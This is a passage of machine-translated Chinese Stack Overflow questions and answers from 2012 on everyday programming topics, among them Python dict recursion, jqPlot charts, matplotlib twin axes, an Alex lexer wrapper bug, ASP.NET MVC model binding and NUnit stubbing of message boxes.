```
from random import choice
from copy import deepcopy

def main():

    def rand_int():
        return choice(['yes', 'no'])

    # any nesting, functions possible
    spec = {
        'answer': rand_int,
        'next': {'answer': rand_int},
        'the_answer': 42
    }

    #### looking for elegant (automatic) way to do this
    result = deepcopy(spec)
    result['answer'] = result['answer']()
    result['next']['answer'] = result['next']['answer']()
    #### until here

    # result2 = ...

    print 'result: %s' % result

if __name__ == '__main__':
    main() 
```

请不要告诉我使用xsd！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-09T10:32:04.443

[你可以用字典理解](https://www.youtube.com/watch?v=t85uBptTDYY)中的一行来做到这一点：

```
{key: function() for key, function in mydictionary.items()} 
```

当然，当值不是函数时，这会抛出错误，所以如果有可能，我们可以简单地使用[内置`callable()`函数](http://docs.python.org/library/functions.html#callable)添加检查：

```
{key: (function() if callable(function) else function) for key, function in mydictionary.items()} 
```

然后我们需要处理您的答案需要递归的事实，这使得它有点复杂，但不太难修复：

```
def call_all_callables_in_dict(mapping):
    if hasattr(mapping, "items"):
        return {key: call_all_callables_in_dict(value) for key, value in mapping.items()}
    elif callable(mapping):
        return mapping()
    else:
        return mapping 
```

请注意，如果您的对象具有`items`要存储在`dict`this 函数中的属性或方法，则将在此函数上运行，这可能会导致问题。我建议更改该属性或方法的名称，或将检查替换为`isinstance(dict)`.

我还想指出，对于`rand_int`返回字符串`'yes'`或的误导性函数名称`'no'`可能与它得到的一样糟糕。通常，您也希望`True`/`False`在这些情况下。

如评论中所述，在 Python 2.7 之前，您可能没有字典理解。为了解决这个问题，`dict()`将使用元组生成器，因此您可以像这样替换 dict 理解：

```
{x: y for x, y in something.items()} 
```

和：

```
dict((x, y) for x, y in something.items()) 
```

* * *

所以，完整的：

```
from random import choice

def rand_int():
        return choice(['yes', 'no'])

spec = {
    'answer': rand_int,
    'next': {'answer': rand_int},
    'the_answer': 42
}

def call_all_callables_in_dict(mapping):
    if hasattr(mapping, "items"):
        return {key: call_all_callables_in_dict(value) for key, value in mapping.items()}
    elif callable(mapping):
        return mapping()
    else:
        return mapping

print(call_all_callables_in_dict(spec)) 
```

给我们：

```
{'answer': 'no', 'the_answer': 42, 'next': {'answer': 'yes'}} 
```

# magento - 如何在magento网站中显示日期和时间？

> ID：10514274
> 
> 赞同：0
> 
> 时间：2012-05-09T10:29:48.260
> 
> 标签：magento

我想在登录选项下方的 magento 网站顶部显示日期和时间。谁能告诉我如何实现这一目标？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:43:40.943

您需要在 template/page/html/ 中编辑 header.phtml 文件

插入这个：

```
<div class="date-time">
<?php echo strftime('%c');?>
</div> 
```

以下

```
<?php echo $this->getChildHtml('topLinks') ?> 
```

然后你可以在你的CSS中添加一个类日期时间并调整它的位置

寻找可以提供给 strftime 函数的不同格式，以便以不同方式获取日期时间

# javascript - 使用 jQuery 图像滑块到多个页面

> ID：10514275
> 
> 赞同：0
> 
> 时间：2012-05-09T10:29:50.120
> 
> 标签：javascript, html, slider, image

我有一个图像滑块。这是一个简单的，已经用 js/jQuery 完成。当我打开主页时，它从 image1 开始，遍历所有这些，然后再次启动循环。我不知道如何完成的事情是：有没有办法可以将滑块与 .html 页面分开？关键是 - 我可以让滑块记住它的当前图像以及当我打开另一个 .html 页面时从上一页中的当前页面开始吗？例如，我在滑块中加载了 30 张图像。当前是 image12 -> 我在浏览器中加载另一个 .html 页面，滑块从 image12 开始，而不是从 image1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:40:09.083

1.  重写以处理诸如 startSlideShowFromImageNo 之类的设置值
2.  在每次幻灯片更改时设置/更新 cookie
3.  在幻灯片初始化时阅读该 cookie

# objective-c - 将自定义字体添加到项目，以编程方式将项目添加到 plist

> ID：10514276
> 
> 赞同：0
> 
> 时间：2012-05-09T10:29:52.650
> 
> 标签：objective-c, ios, uifont

我想为我的项目添加一些字体。我的项目中有目录包含字体。所以我可以通过以下方式访问我的字体：

```
NSString* path = [[NSBundle mainBundle] pathForResource:@"res_name" ofType:@"res_type" inDirectory:@"res_directory"]; 
```

但是如何将它添加到我的项目中，这样我就可以这样称呼它：

```
[UIFont fontWithName:@"Font-Name" size:14.0] 
```

我只对如何以**编程**方式执行此操作感兴趣我假设我必须将其添加到我的 plist 中，但是我可以以编程方式执行此操作吗？

我知道必须在 plist 中使用：

```
<key>UIAppFonts</key>
<array>
    <string>swellfont.ttf</string>
</array> 
```

但我不能在 Xcode 中手动执行此操作。我想检查我在资源目录中的项目中包含哪些字体，并从代码中以编程方式添加它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:58:01.077

Info.plist 中的[UIAppFonts](https://developer.apple.com/library/mac/documentation/General/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html#//apple_ref/doc/uid/TP40009252-SW18)键。

* * *

您可以查看[Core Text Font Manager](https://developer.apple.com/library/ios/#documentation/Carbon/Reference/CoreText_FontManager_Ref/Reference/reference.html)以查看通过 URL 注册字体是否可以使用`+[UIFont fontWithName:]`.

# java - 从 python/django 学习 java/spring

> ID：10514279
> 
> 赞同：1
> 
> 时间：2012-05-09T10:29:58.067
> 
> 标签：java, django, spring

我需要学习 java（具有基本的先前经验）+ 1 个特定的应用程序框架，我大部分时间都花在 Python 和 Django 上。选择Spring主要是因为我的要求。

May I know what could be the equivalent of Django's development server in Java so I can easily run and check my Java code?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T10:32:14.833

您可以使用 Spring 将 Web 应用程序部署到任何 Java EE 应用程序服务器。我想说最简单的选择是Tomcat，Apache servlet/JSP 引擎。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:10:37.700

如果您使用的是[netbeans](http://netbeans.org/features/index.html) ，那么 Glassfish 非常适合，因为两者之间有很好的集成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:58:44.150

我还建议使用[Jetty](http://jetty.codehaus.org/jetty/)，它是一个像 Tomcat 一样的轻量级 servlet 容器，但请记住这个线程中提到的有关部署 Java EE 应用程序的问题[Jetty 可以用作 Java EE 轻量级应用程序服务器吗？](https://stackoverflow.com/questions/4903823/can-jetty-be-used-as-a-java-ee-lightweight-application-server).

另一种选择是[Glassfish](http://glassfish.java.net/)。

# asp.net - 在 ASP.NET 中按月和年分组的 RDLC 报告

> ID：10514287
> 
> 赞同：0
> 
> 时间：2012-05-09T10:30:38.000
> 
> 标签：asp.net, entity-framework, report, rdlc, drillthrough

我有一个带有`ReportViewer`控件的 ASP.NET Web 窗体的 ASP.NET MVC 4 应用程序。我正在使用实体框架。

我想显示一个带有 Orders(id, date_add, name,quantity, price) 的表格

```
1 | 2011-12-08 | apples  | 4  | 0.99

2 | 2012-01-07 | oranges | 20 | 1.39

4 | 2012-03-04 | plumes  | 80 | 1.59

5 | 2012-05-01 | apples  | 15 | 0.89

6 | 2012-05-03 | pears   | 10 | 1.29

7 | 2012-05-09 | oranges | 18 | 1.49 
```

我希望我的报告看起来像这样：

```
December - Sum(price for dec 2011)

1 | 2011-12-08 | apples  | 4  | 0.99

2011 - Sum(price for 2011)

January - Sum(price for jan 2012)

2 | 2012-01-07 | oranges | 20 | 1.39

March - Sum(price for mar 2012)

4 | 2012-03-04 | plumes  | 80 | 1.59

May - Sum(price for may 2012)

5 | 2012-05-01 | apples  | 15 | 0.89

6 | 2012-05-03 | pears   | 10 | 1.29

7 | 2012-05-09 | oranges | 18 | 1.49

2012 - Sum(price for 2012) 
```

如何使用钻取来完成？

并且可以折叠月份并且可以看到年份（在第一次运行时）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T09:12:19.597

我制作了一个 SP，在其中提取周、月和年编号。从*数据*_add 字段。

```
CREATE PROCEDURE [dbo].[Orders]         
AS
   SELECT  id_order, data_add, order_name, quantity, price, MONTH(data_add) as Mn, YEAR(data_add) as Ye, DATEPART( wk, data_add) as Week,
   FROM order
RETURN 
```

在报告的 Tablix 中，我已经分组了 2 次（首先按月，然后按年）。

# sql-server-2008 - 用于在 SQL 中创建 SP 的 .Net 应用程序

> ID：10514289
> 
> 赞同：1
> 
> 时间：2012-05-09T10:30:44.027
> 
> 标签：sql-server-2008

我想创建一个 Dot net 应用程序并为用户提供一个环境，可能是多行文本框，用户可以在其中粘贴预定义的 SP 并执行。执行后这个 Sp 应该在 DB 中创建

任何想法都被邀请..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:38:58.310

我假设您想为内部支持应用程序或类似的东西这样做，而不是对最终用户，对吧？

无论如何，您需要更加具体，但是您创建过程的方式与运行插入语句的方式没有区别。

简单的例子：

```
SqlConnection objConnection = new SqlConnection(your_connection_string);
SqlCommand objCommand = new SqlCommand(tbProcedureCode.text, objConnection);
objCommand.CommandType = CommandType.Text;

objConnection.Open();
objCommand.ExecuteNonQuery(); 
```

# php - 获取给定月份名称之后和之前的月份

> ID：10514291
> 
> 赞同：3
> 
> 时间：2012-05-09T10:30:51.760
> 
> 标签：php, date, strtotime

如何在给定月份后获取月份名称。所以六月，我想要七月

我试过了：

```
$next_month = date('F',strtotime('June', "next month")); 
```

这个显示一月，这显然是错误的，我正在寻找七月。

那么我将如何获得前一个月？

我试过了

```
$prev_month = date('F',strtotime('June - 1 month')); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-09T10:33:20.590

```
$next_month = date('F',strtotime('June + 1 month')); 
```

或者

```
$next_month = date('F',strtotime('June next month')); 
```

**编辑**

```
$next_month = date('F',strtotime('June last month')); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T10:35:58.457

```
echo date('F',strtotime('June + 1 month')); 
```

# validation - Symfony 2 中带有参数/参数的自定义验证器/约束

> ID：10514301
> 
> 赞同：5
> 
> 时间：2012-05-09T10:31:34.013
> 
> 标签：validation, symfony

我想创建一个类似于 GitHub 处理删除存储库的方式的验证器。要确认删除，我需要输入 repo 名称。在这里，我想通过输入实体属性“名称”来确认删除。我需要将名称传递给约束或以某种方式访问​​它，我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T09:07:45.857

您确实可以使用验证器约束来做到这一点：

**1：创建删除表单（直接或使用类型）：**

```
 return $this->createFormBuilder($objectToDelete)
        ->add('comparisonName', 'text')
        ->setAttribute('validation_groups', array('delete'))
        ->getForm()
    ; 
```

**2：将公共属性添加`comparisonName`到您的实体中。（或使用代理对象），这将被映射到上面相应的表单字段。**

**3：定义一个类级别，回调验证器约束来比较两个值：**

```
/**
 * @Assert\Callback(methods={"isComparisonNameValid"}, groups={"delete"})
 */
class Entity 
{
    public $comparisonName;
    public $name;

    public function isComparisonNameValid(ExecutionContext $context)
    {
        if ($this->name !== $this->comparisonName) {
            $propertyPath = $context->getPropertyPath() . '.comparisonName';
            $context->addViolationAtPath(
                $propertyPath,
                'Invalid delete name', array(), null
            );
        }
    }
} 
```

**4：在您的视图中显示您的表单：**

```
<form action="{{ path('entity_delete', {'id': entity.id }) }}">
   {{ form_rest(deleteForm) }}
   <input type="hidden" name="_method value="DELETE" />
   <input type="submit" value="delete" />
</form> 
```

**5：要验证删除查询是否有效，请在您的控制器中使用：**

```
 $form    = $this->createDeleteForm($object);
    $request = $this->getRequest();

    $form->bindRequest($request);
    if ($form->isValid()) {
        $this->removeObject($object);
        $this->getSession()->setFlash('success',
            $this->getDeleteFlashMessage($object)
        );
    }

    return $this->redirect($this->getListRoute()); 
```

# asp.net-mvc-3 - 删除放大器；来自 mvc3 razor 中的值

> ID：10514309
> 
> 赞同：1
> 
> 时间：2012-05-09T10:32:07.860
> 
> 标签：asp.net-mvc-3, razor, html-encode

我需要删除放大器；来自 mvc3 razor 中的值

> @Microsoft.Web.Helpers.Video.Flash("/Content/flash/tc.swf", 宽度: "790", 高度: "150", 选项: new { FlashVars = "root=/Content/flash/modeli&butt_info= /Content/flash/modeli/btn_1.png&butt_info_over=/Content/flash/modeli/btn_1_1.png&butt_build=/Content/flash/modeli/btn_2.png&butt_build_over=/Content/flash/modeli/btn_2_1.png&tit=/Content/flash/modeli /main_title.png&txt=菲亚特伽马&macchine=/Content/flash/modeli/00.png,/Content/flash/modeli/01.png&stitolo=/Content/flash/modeli/car_title.jpg,/Content/flash/modeli/car_title. jpg&codici_rif=201,196&CarNames=201,196"})

在浏览器`&`中被编码`&amp;`，然后 swf 文件无法识别该值

我尝试了@html.raw 和我在网上找到的其他解决方案，但它不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T21:18:30.470

尝试`Server.HtmlDecode("...")`或`HttpUtility.UrlDecode("...")`。

# jquery - 为 JqPlot 条形图构造 JSON

> ID：10514311
> 
> 赞同：1
> 
> 时间：2012-05-09T10:32:08.973
> 
> 标签：jquery, asp.net-mvc, json, jqplot

我设法创建了一些东西来填充 JqPlot 饼图（非常硬编码——它将是自动化的）。以下是我的做法：

```
public ActionResult PieChart()
    {
        return View();
    }

    public ActionResult PieChartJSON()
    {
        List<PieChartData> sampleData = new List<PieChartData>();
        PieChartData test = new PieChartData();
        PieChartData test2 = new PieChartData();
        PieChartData test3 = new PieChartData();
        PieChartData test4 = new PieChartData();
        PieChartData test5 = new PieChartData();

        test.Label = "ta";
        test.Value = 3;
        sampleData.Add(test);

        test2.Label = "be";
        test2.Value = 5;
        sampleData.Add(test2);

        test3.Label = "ga";
        test3.Value = 3;
        sampleData.Add(test3);

        test4.Label = "ma";
        test4.Value = 8;
        sampleData.Add(test4);

        test5.Label = "ja";
        test5.Value = 8;
        sampleData.Add(test5);

        return Json(sampleData, JsonRequestBehavior.AllowGet);
    } 
```

jQuery：

```
jQuery(document).ready(function () {
    urlDataJSON = '/Home/PieChartJSON';

    $.getJSON(urlDataJSON, "", function (data) {
        var dataSlices = [];
        var dataLabels = "";

        $.each(data, function (entryindex, entry) {
            dataSlices.push(entry['Value']);
            dataLabels = dataLabels + entry['Label'];
        });
        options = {
            legend: { show: true },
            title: 'Poll Results',
            seriesDefaults: {
                // Make this a pie chart.
                renderer: jQuery.jqplot.PieRenderer,
                rendererOptions: {
                    // Put data labels on the pie slices.
                    // By default, labels show the percentage of the slice.
                    showDataLabels: true
                }
            }
        }
        var plot = $.jqplot('pieChart', [dataSlices], options);
    });
}); 
```

[https://i.stack.imgur.com/ohup4.png](https://i.stack.imgur.com/ohup4.png) *生成图

我希望能够在下一页上创建类似于条形图的内容：[http](http://www.jqplot.com/tests/bar-charts.php) ://www.jqplot.com/tests/bar-charts.php （第二个图表向下）。此条形图是使用以下 jQuery 创建的：

我对 C# 和 Json 还是很陌生，我有点不确定应该如何构造 JSON 数据来创建这个条形图。谁能帮我吗？

```
 $(document).ready(function(){
    // For horizontal bar charts, x an y values must will be "flipped"
    // from their vertical bar counterpart.
    var plot2 = $.jqplot('chart2', [
        [[2,1], [4,2], [6,3], [3,4]], 
        [[5,1], [1,2], [3,3], [4,4]], 
        [[4,1], [7,2], [1,3], [2,4]]], {
        seriesDefaults: {
            renderer:$.jqplot.BarRenderer,
            // Show point labels to the right ('e'ast) of each bar.
            // edgeTolerance of -15 allows labels flow outside the grid
            // up to 15 pixels.  If they flow out more than that, they 
            // will be hidden.
            pointLabels: { show: true, location: 'e', edgeTolerance: -15 },
            // Rotate the bar shadow as if bar is lit from top right.
            shadowAngle: 135,
            // Here's where we tell the chart it is oriented horizontally.
            rendererOptions: {
                barDirection: 'horizontal'
            }
        },
        axes: {
            yaxis: {
                renderer: $.jqplot.CategoryAxisRenderer
            }
        }
    });
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T12:43:15.877

了解您想为给定数据构建条形图后，假设您的`JSON`数据以数组形式出现，您可以按以下方式构建 dataSlice：

```
var json = [
    {"Label": "be", "Value": 5}
    ,{"Label": "ga", "Value": 3}
    ,{"Label": "ma", "Value": 8}
    ,{"Label": "ja", "Value": 8}];
var dataSlices = [];
var ticks = [];
$.each(json, function (entryindex, entry) {
    dataSlices.push(entry['Value']);
    ticks.push(entry['Label']);
}); 
```

这[在以下代码](https://jsfiddle.net/QvQYB/5/)中进行了演示，该代码重用了[jqPlot 网站的标准示例](http://www.jqplot.com/tests/bar-charts.php)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-04T11:52:16.560

试试这个，工作正常，

```
 $.getJSON('/mservice/getvalues', function(data) {
        var items1 = new Array();
        var j=0;
        for ( var i in data ) {
            var items = new Array();
            items.push(i,Number(data[i]));
            items1[j++] = items;
        }

        var plot1 = jQuery.jqplot('chart1', eval([items1]), {

                    seriesDefaults:{
                        renderer:jQuery.jqplot.PieRenderer,
                        rendererOptions:{
                            dataLabels:'value',
                            showDataLabels:true
                        }
                    },
                    legend:{ show:true, location:'e' }
                }
        );

    }); 
```

# python - 如何在 matplotlib 中添加第二个 x 轴

> ID：10514315
> 
> 赞同：92
> 
> 时间：2012-05-09T10:32:30.940
> 
> 标签：python, matplotlib

我有一个非常简单的问题。我需要在我的绘图上有第二个 x 轴，并且我希望这个轴有一定数量的抽动，这些抽动对应于第一个轴的某个位置。

让我们尝试一个例子。在这里，我将暗物质质量绘制为膨胀因子的函数，定义为 1/(1+z)，范围从 0 到 1。

```
semilogy(1/(1+z),mass_acc_massive,'-',label='DM')
xlim(0,1)
ylim(1e8,5e12) 
```

我想在我的绘图顶部有另一个 x 轴，显示扩展因子的某些值对应的 z。那可能吗？如果是，我怎样才能拥有 xtics 斧头

* * *

## 回答 #1

> 赞同：134
> 
> 时间：2012-05-09T13:49:02.177

我从@Dhara 的回答中的评论中得到提示，听起来你想设置一个`new_tick_locations`从旧 x 轴到新 x 轴的函数列表。下面`tick_function`接受一个 numpy 点数组，将它们映射到一个新值并格式化它们：

```
import numpy as np
import matplotlib.pyplot as plt

fig = plt.figure()
ax1 = fig.add_subplot(111)
ax2 = ax1.twiny()

X = np.linspace(0,1,1000)
Y = np.cos(X*20)

ax1.plot(X,Y)
ax1.set_xlabel(r"Original x-axis: $X$")

new_tick_locations = np.array([.2, .5, .9])

def tick_function(X):
    V = 1/(1+X)
    return ["%.3f" % z for z in V]

ax2.set_xlim(ax1.get_xlim())
ax2.set_xticks(new_tick_locations)
ax2.set_xticklabels(tick_function(new_tick_locations))
ax2.set_xlabel(r"Modified x-axis: $1/(1+X)$")
plt.show() 
```

![在此处输入图像描述](../Images/19e0291026d9dc1ed3e08077991919e8.png)

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2012-05-09T11:24:54.013

您可以使用 twiny 创建 2 个 x 轴刻度。例如：

```
import numpy as np
import matplotlib.pyplot as plt

fig = plt.figure()
ax1 = fig.add_subplot(111)
ax2 = ax1.twiny()

a = np.cos(2*np.pi*np.linspace(0, 1, 60.))

ax1.plot(range(60), a)
ax2.plot(range(100), np.ones(100)) # Create a dummy plot
ax2.cla()
plt.show() 
```

参考： http: [//matplotlib.sourceforge.net/faq/howto_faq.html#multiple-y-axis-scales](http://matplotlib.sourceforge.net/faq/howto_faq.html#multiple-y-axis-scales)

输出： ![在此处输入图像描述](../Images/2388d05b89f43f78e744367ba0c10ea7.png)

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2014-05-23T14:44:59.693

如果您希望上轴成为下轴刻度值的函数，您可以执行以下操作。请注意：有时`get_xticks()`会有超出可见范围的刻度，转换时必须允许。

```
import matplotlib.pyplot as plt

fig, ax1 = plt.subplots()

ax1 = fig.add_subplot(111)

ax1.plot(range(5), range(5))

ax1.grid(True)

ax2 = ax1.twiny()
ax2.set_xticks( ax1.get_xticks() )
ax2.set_xbound(ax1.get_xbound())
ax2.set_xticklabels([x * 2 for x in ax1.get_xticks()])

title = ax1.set_title("Upper x-axis ticks are lower x-axis ticks doubled!")
title.set_y(1.1)
fig.subplots_adjust(top=0.85)

fig.savefig("1.png") 
```

给出：

![在此处输入图像描述](../Images/8a275417942d70e21fa58a63768cc3cb.png)

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2012-05-09T14:07:47.673

在 Dhara 的回答评论中回答您的问题：“*我想在第二个 x 轴上这些抽动：(7,8,99) 对应于 x 轴位置 10,30,40。这可能以某种方式吗？* “是的， 它是。

```
import numpy as np
import matplotlib.pyplot as plt

fig = plt.figure()
ax1 = fig.add_subplot(111)

a = np.cos(2*np.pi*np.linspace(0, 1, 60.))
ax1.plot(range(60), a)

ax1.set_xlim(0, 60)
ax1.set_xlabel("x")
ax1.set_ylabel("y")

ax2 = ax1.twiny()
ax2.set_xlabel("x-transformed")
ax2.set_xlim(0, 60)
ax2.set_xticks([10, 30, 40])
ax2.set_xticklabels(['7','8','99'])

plt.show() 
```

你会得到： ![在此处输入图像描述](../Images/78fd3017b15b65156294d5e6017912d2.png)

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2019-12-17T17:17:38.833

从 matplotlib 3.1 开始，您可以使用[`ax.secondary_xaxis`](https://matplotlib.org/api/_as_gen/matplotlib.axes.Axes.secondary_xaxis.html)

```
import numpy as np
import matplotlib.pyplot as plt

x = np.linspace(1,13, num=301)
y = (np.sin(x)+1.01)*3000

# Define function and its inverse
f = lambda x: 1/(1+x)
g = lambda x: 1/x-1

fig, ax = plt.subplots()
ax.semilogy(x, y, label='DM')

ax2 = ax.secondary_xaxis("top", functions=(f,g))

ax2.set_xlabel("1/(x+1)")
ax.set_xlabel("x")
plt.show() 
```

![](../Images/4226d264d46d46e869360dc72018048e.png)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-01-28T02:32:24.203

由于声誉低下，我被迫将其发布为答案而不是评论。我遇到了与 Matteo 类似的问题。不同之处在于我没有从第一个 x 轴到第二个 x 轴的映射，只有 x 值本身。所以我想直接在我的第二个 x 轴上设置数据，而不是刻度，但是，没有`axes.set_xdata`. 我可以使用 Dhara 的答案进行修改：

```
ax2.lines = [] 
```

而不是使用：

```
ax2.cla() 
```

使用时也清除了我的情节`ax1`。

# haskell - Haskell Alex - 包装模板中的错误

> ID：10514316
> 
> 赞同：6
> 
> 时间：2012-05-09T10:32:31.757
> 
> 标签：haskell, alex

我试图总体上理解 Alex 和词法分析器，但我无法运行我的词法分析器。

我在“basic”和“posn”包装器中编写了词法分析器，但我不能在“monad”包装器中。我想我必须使用`monad`包装器，因为我需要在输入中收集字符串和令牌位置。我还需要多个状态。现在我正在尝试运行这个简单的例子：

```
{
module Main (main) where
}

%wrapper "monad"

$whitespace = [\ \b\t\n\f\v\r]
$digit      = 0-9
$alpha      = [a-zA-Z_]
$upper      = [A-Z]
$lower      = [a-z]

@tidentifier = $upper($alpha|_|$digit)*
@identifier  = $lower($alpha|_|$digit)*

tokens :-

$whitespace+ ;
$upper $alpha+ { typeId }
$lower $alpha+ { id_ }
$digit+ { int }

{

data Lexeme = L AlexPosn LexemeClass String

data LexemeClass
        = TypeId String
        | Id String
        | Int Int
        | EOF
    deriving (Show, Eq)

typeId :: AlexInput -> Int -> Alex Lexeme
typeId = undefined

id_ :: AlexInput -> Int -> Alex Lexeme
id_ = undefined

int :: AlexInput -> Int -> Alex Lexeme
int = undefined

alexEOF = return (L undefined EOF "")

main :: IO ()
main = do
    s <- getContents
    let r = runAlex s $ do
                return alexMonadScan
    print r
} 
```

我的行动是`undefined`暂时的。当我尝试编译它时，我收到了这个错误：

```
➜  haskell  ghc --make Tokens.hs
[1 of 1] Compiling Main             ( Tokens.hs, Tokens.o )

templates/wrappers.hs:208:17:
    Couldn't match expected type `(AlexPosn, Char, [Byte], String)'
                with actual type `(t0, t1, t2)'
    Expected type: AlexInput
      Actual type: (t0, t1, t2)
    In the return type of a call of `ignorePendingBytes'
    In the first argument of `action', namely
      `(ignorePendingBytes inp)' 
```

当我尝试在 Alex 的 github 存储库中编译示例时，我也遇到了各种错误，这可能与版本不匹配有关吗？我已经使用 ghc 7.0.4 从 cabal 安装了 alex。有任何想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-09T15:54:05.413

这看起来像是 Alex 3.0.1 中的一个错误。在处理了代码¹中的一些其他不相关问题后，它在 2.3.3 版本中运行良好。问题是生成的代码中的这一行：

```
ignorePendingBytes (p,c,ps,s) = (p,c,s) 
```

通过遵循生成代码中的类型，该函数似乎应该具有 type `AlexInput -> AlexInput`，但`AlexInput`显然不能同时是 3 元组和 4 元组。

这可能是因为`AlexInput`两个版本之间的定义发生了变化。

```
type AlexInput = (AlexPosn, Char, String)         -- v2.3.3
type AlexInput = (AlexPosn, Char, [Byte], String) -- v3.0.1 
```

据我所知，正确的代码应该是

```
ignorePendingBytes (p,c,ps,s) = (p,c,[],s) 
```

并在生成的代码中手动进行此更改使其在处理其他问题后编译。

但是，除非您需要 3.0.1 中的某些内容，否则我建议您降级直到修复此问题，因为必须针对生成的代码维护补丁通常比它的价值更麻烦。

[¹您的代码缺少一个`Show`实例 for`Lexeme`并且您还在调用`return`on `alexMonadScan`，它已经在`Alex`monad 中。]

# asp.net-mvc-3 - viewmodel 在 HttpPost 上返回 null

> ID：10514322
> 
> 赞同：1
> 
> 时间：2012-05-09T10:32:48.490
> 
> 标签：asp.net-mvc-3, c#-4.0

我创建了如下视图。

```
<%for (var i = 0; i < Model.customerCDTO.Count();i++)
  {%>
  <tr>
     <td style="text-align: center; width: 10%;" class="table-content-middle">
     <%if (Model.customerCDTO[i].Active == true)
      {%>
      <%=Html.CheckBoxFor(m=>m.customerCDTO[i].Active)%>
      <%}
      else
      { %>
      <%=Html.CheckBoxFor(m => m.customerCDTO[i].Active)%>
    <%} %>
     </td>
     <td class="table-content-middle" align="center" style="width: 80%;">
     <%=Html.DisplayTextFor(m=>m.customerCDTO[i].Name)%>
     </td>
     </tr>
 <%} %> 
```

上述观点的问题在于它为 customerCDTO[i].Name 赋予 null 值

下面是我的视图模型

```
public class CustomerVM
{
public List<CustomerCDTO> customerCDTO { get; set; }
} 
```

在上面的视图模型中，我创建了一个 List 属性。CustomerCDTO 类定义如下。

```
public class CustomerCDTO
{
public string Name { get; set; }
public bool Active { get; set; }
public bool? IsChecked { get; set; }
} 
```

请帮忙。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:50:07.690

它为您提供了一个`null`值，因为您的表单不包含`<input>`与该属性相对应的任何元素`Name`（如果您查看源代码，您可以立即发现）。这样做的原因`DisplayTextFor`是不应该首先创建这样的元素。

一个**几乎总是坏主意**的方法是调用`Html.HiddenFor`，它*确实*创建了输入元素：

```
<td class="table-content-middle" align="center" style="width: 80%;">
    <%=Html.DisplayFor(m=>m.customerCDTO[i].Name)%>
    <%=Html.HiddenFor(m=>m.customerCDTO[i].Name)%>
</td> 
```

这将解决您的问题，但随后用户可以使用 Firebug 之类的工具简单地编辑值并更改 的值`Name`，这显然是您不想要的，否则您将`<input>`为此提供一个元素。（注意：我也改为`DisplayTextFor`，`DisplayFor`这通常是更正确的做事方式）。

但是那该怎么办呢？好吧，这里没有神奇的解决方案。如果表单不包含`Name`，那么它将是`null`，但如果它*包含*（`Name`甚至隐藏），那么用户可以随意更改它。如果这是一个问题，唯一的选择是修改您的后端代码以`Name`从您的数据存储中填充。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:44:53.387

在对数据库运行查询后，您能否确保您的列表中填充了您的预期数据。事实上，您的数据似乎没有正确填充。

# c# - 为提示消息框的方法编写 NUnit 测试用例

> ID：10514327
> 
> 赞同：3
> 
> 时间：2012-05-09T10:33:15.923
> 
> 标签：c#, nunit-2.5

我有一个具有以下结构的方法：

```
bool myMethod(some arguments)
{

   //Show User Dialog

} 
```

显示的用户对话框有 4 个按钮，“是”、“对所有都是”、“否”、“对所有都没有”。

当我运行测试用例时，它会显示用户对话框，但测试用例在用户单击任何按钮之前不会继续。我们如何使用 nUnit 测试用例覆盖这些方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T10:54:51.187

您必须注入一些可以*终止*`Show User Dialog`呼叫的东西。然后，您可以在测试中将存根设置为所需的用户答案并调用您的方法：

```
public class MyClass
{
    private IMessageBox _MessageBox;

    public MyClass(IMessageBox messageBox)
    {
        _MessageBox = messageBox;
    }

    public bool MyMethod(string arg)
    {
        var result = _MessageBox.ShowDialog();
        return result == DialogResult.Ok;
    }
}

internal class MessageBoxStub : IMessageBox
{
    DialogResult Result {get;set;}

    public DialogResult ShowDialog()
    {
        return Result;
    }
}

[Test]
public void MyTest()
{
    var messageBox = new MessageBoxStub() { Result = DialogResult.Yes }
    var unitUnderTest = new MyClass(messageBox);

    Assert.That(unitUnderTest.MyMethod(null), Is.True);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T10:44:04.827

这取决于你想测试什么。如果您只是关心用户响应后应用程序的流程（他们按是、否等），那么您可以只存根“假”响应：

```
public void MessageBox_UserPressesOK()
{
var result == Dialog.OK
    // test
} 
```

等等。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T11:19:07.290

您可以使用[Typemock Isolator](http://www.typemock.com/quick-start-page-core)（请注意，这不是免费工具），这是他们网页上的确切示例：

```
[Test]
public void SimpleTestUsingMessageBox()
{
 // Arrange
 Isolate.WhenCalled(()=>MessageBox.Show(String.Empty)).WillReturn(DialogResult.OK);

 // Act
 MessageBox.Show("This is a message");

 // Assert
 Isolate.Verify.WasCalledWithExactArguments(()=>MessageBox.Show("This is a message"));
} 
```

# facebook - 从 Graph API 下载多个个人资料图片的有效方法

> ID：10514330
> 
> 赞同：0
> 
> 时间：2012-05-09T10:33:20.253
> 
> 标签：facebook, facebook-graph-api

